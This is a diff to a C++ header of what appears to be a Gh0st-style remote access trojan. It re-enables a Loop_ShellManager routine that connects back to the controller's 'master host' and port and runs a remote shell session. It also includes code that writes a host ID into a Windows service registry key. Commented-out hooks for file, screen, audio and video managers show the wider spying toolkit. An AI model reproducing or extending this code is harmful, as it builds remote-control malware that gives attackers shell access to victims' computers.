@@ -1,9 +1,10 @@
-#if !defined(AFX_LOOP_H_INCLUDED)
-#define AFX_LOOP_H_INCLUDED
-#include "KernelManager.h"
+#pragma once
+
+
+#include "../DllServer/KernelManager.h"
 //#include "FileManager.h"
 //#include "ScreenManager.h"
-//#include "ShellManager.h"
+#include "ShellManager/ShellManager.h"
 //#include "VideoManager.h"
 //#include "AudioManager.h"
 //#include "SystemManager.h"
@@ -25,18 +26,18 @@ extern bool g_bSignalHook;
 //	return 0;
 //}
 
-//DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
-//{
-//	CClientSocket	socketClient;
-//	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-//		return -1;
-//	
-//	CShellManager	manager(&socketClient);
-//	
-//	socketClient.run_event_loop();
-//
-//	return 0;
-//}
+DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
+{
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+	
+	CShellManager	manager(&socketClient);
+	
+	socketClient.run_event_loop();
+
+	return 0;
+}
 
 //DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
 //{
@@ -230,6 +231,3 @@ void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
 	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
 	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpHostID, lstrlen(lpHostID), 0);
 }
-
-
-#endif // !defined(AFX_LOOP_H_INCLUDED)
